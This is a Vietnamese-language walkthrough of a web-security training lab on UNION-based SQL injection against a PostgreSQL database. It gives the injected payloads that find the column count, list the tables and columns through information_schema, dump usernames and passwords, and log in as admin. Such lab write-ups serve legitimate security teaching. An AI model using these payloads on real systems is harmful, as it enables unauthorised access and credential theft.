## SQL injection attack, listing the database contents on non-Oracle databases

Tiếp tục thực hiện inject query vào sau url **' order by 2--** (tới 3 là lỗi) do web load bình thường ta biết được database vẫn có 2 trường.

Tiếp tục truy vấn ra tên cơ sở dữ liệu từng lệnh như trong cheatsheet để xác định cơ sở dữ liệu nào.  

> **' union select version(),NULL--**

![](/imgs/SQL-Injection/22.png?raw=true)

Lab yêu cầu ta phải đăng nhập bằng tài khoản trong bảng user nên ta phải biết bảng user tên là gì trong database

Câu query list tất cả các table trong Postgres: SELECT * FROM information_schema.tables
Nhưng chúng ta không thể select * để lấy tất cả được vì sẽ bị lỗi trên url => cho nên chúng ta sẽ sử dụng các column name đặc biệt trong Postgres.

(https://www.postgresql.org/docs/9.5/infoschema-columns.html)

![](/imgs/SQL-Injection/23.png?raw=true)

Sau khi thực hiện truy vấn 
```markdown
**' UNION SELECT table_name,NULL%20 FROM information_schema.tables--**
```

![](/imgs/SQL-Injection/24.png?raw=true)

Chúng ta sẽ tìm tới bảng users, do sẽ có nhiều bảng user nên thường ngta sẽ đặt tên bảng là số nhiều nên chúng ta chỉ chú ý trước những bảng này để select.

Ở đây mình sẽ select bảng **users_tucmxy**

Dựa theo [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) lệnh select ra các trường có trong bảng sẽ là

> **SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'**

Áp dụng vào

```markdown
**' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_tucmxy--**
```

Chúng ta sẽ thu được 2 trường **username_sxdvlv** và **password_pnxobl**

![](/imgs/SQL-Injection/25.png?raw=true)

Chúng ta đã biết được tên các trường và tên bảng, tiến hành select ra data

```markdown
**' UNION SELECT username_sxdvlv,password_pnxobl from users_tucmxy--**
```

![](/imgs/SQL-Injection/26.png?raw=true)

Login vào tài khoản admin là solve

![](/imgs/SQL-Injection/27.png?raw=true)





